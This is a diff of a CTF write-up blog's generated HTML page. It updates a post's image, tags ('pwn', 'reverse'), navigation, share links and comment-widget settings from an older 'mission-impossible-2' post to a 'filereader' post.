+      
+    
+  
+
+<div class="figure fig-100 center" >
+  
+    <a class="fancybox" href="https://hug0vincent.github.io/images/filereader/flag.png" data-fancybox-group="">
+  
+    <img class="fig-img" src="https://hug0vincent.github.io/images/filereader/flag.png" >
   
     </a>
   
@@ -735,11 +797,9 @@ Archive:  flag.zip
                   <div class="post-footer-tags">
                     <span class="text-color-light text-small">TAGGED IN</span><br/>
                     
-  <a class="tag tag--primary tag--small" href="https://hug0vincent.github.io/tags/forensic/">forensic</a>
+  <a class="tag tag--primary tag--small" href="https://hug0vincent.github.io/tags/pwn/">pwn</a>
 
-  <a class="tag tag--primary tag--small" href="https://hug0vincent.github.io/tags/network/">network</a>
-
-  <a class="tag tag--primary tag--small" href="https://hug0vincent.github.io/tags/crypto/">crypto</a>
+  <a class="tag tag--primary tag--small" href="https://hug0vincent.github.io/tags/reverse/">reverse</a>
 
                   </div>
                 
@@ -752,7 +812,7 @@ Archive:  flag.zip
           
             <li class="post-action">
               
-                <a class="post-action-btn btn btn--default tooltip--top" href="https://hug0vincent.github.io/2018/12/mission-impossible-1/" data-tooltip="Mission impossible 1">
+                <a class="post-action-btn btn btn--disabled">
               
                   <i class="fa fa-angle-left"></i>
                   <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
@@ -760,7 +820,7 @@ Archive:  flag.zip
             </li>
             <li class="post-action">
               
-                <a class="post-action-btn btn btn--disabled">
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://hug0vincent.github.io/2019/05/give-me-your-shell/" data-tooltip="Give Me Your Shell">
               
                   <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
                   <i class="fa fa-angle-right"></i>
@@ -778,13 +838,13 @@ Archive:  flag.zip
         </li>
         
           <li class="post-action hide-xs">
-            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://hug0vincent.github.io/2018/12/mission-impossible-2/">
+            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://hug0vincent.github.io/2019/05/filereader/">
               <i class="fa fa-facebook-official"></i>
             </a>
           </li>
         
           <li class="post-action hide-xs">
-            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://hug0vincent.github.io/2018/12/mission-impossible-2/">
+            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://hug0vincent.github.io/2019/05/filereader/">
               <i class="fa fa-twitter"></i>
             </a>
           </li>
@@ -832,7 +892,7 @@ Archive:  flag.zip
           
             <li class="post-action">
               
-                <a class="post-action-btn btn btn--default tooltip--top" href="https://hug0vincent.github.io/2018/12/mission-impossible-1/" data-tooltip="Mission impossible 1">
+                <a class="post-action-btn btn btn--disabled">
               
                   <i class="fa fa-angle-left"></i>
                   <span class="hide-xs hide-sm text-small icon-ml">NEXT</span>
@@ -840,7 +900,7 @@ Archive:  flag.zip
             </li>
             <li class="post-action">
               
-                <a class="post-action-btn btn btn--disabled">
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://hug0vincent.github.io/2019/05/give-me-your-shell/" data-tooltip="Give Me Your Shell">
               
                   <span class="hide-xs hide-sm text-small icon-mr">PREVIOUS</span>
                   <i class="fa fa-angle-right"></i>
@@ -858,13 +918,13 @@ Archive:  flag.zip
         </li>
         
           <li class="post-action hide-xs">
-            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://hug0vincent.github.io/2018/12/mission-impossible-2/">
+            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://hug0vincent.github.io/2019/05/filereader/">
               <i class="fa fa-facebook-official"></i>
             </a>
           </li>
         
           <li class="post-action hide-xs">
-            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://hug0vincent.github.io/2018/12/mission-impossible-2/">
+            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://hug0vincent.github.io/2019/05/filereader/">
               <i class="fa fa-twitter"></i>
             </a>
           </li>
@@ -894,13 +954,13 @@ Archive:  flag.zip
   <ul class="share-options">
     
       <li class="share-option">
-        <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fhug0vincent.github.io%2F2018%2F12%2Fmission-impossible-2%2F">
+        <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fhug0vincent.github.io%2F2019%2F05%2Ffilereader%2F">
           <i class="fa fa-facebook-official"></i><span>Share on Facebook</span>
         </a>
       </li>
     
       <li class="share-option">
-        <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3A%2F%2Fhug0vincent.github.io%2F2018%2F12%2Fmission-impossible-2%2F">
+        <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3A%2F%2Fhug0vincent.github.io%2F2019%2F05%2Ffilereader%2F">
           <i class="fa fa-twitter"></i><span>Share on Twitter</span>
         </a>
       </li>
@@ -1090,9 +1150,9 @@ $(document).ready(function() {
     
       <script>
         var disqus_config = function () {
-          this.page.url = 'https:\/\/hug0vincent.github.io\/2018\/12\/mission-impossible-2\/';
+          this.page.url = 'https:\/\/hug0vincent.github.io\/2019\/05\/filereader\/';
           
-            this.page.identifier = '\/2018\/12\/mission-impossible-2\/'
+            this.page.identifier = '\/2019\/05\/filereader\/'
           
         };
         (function() {
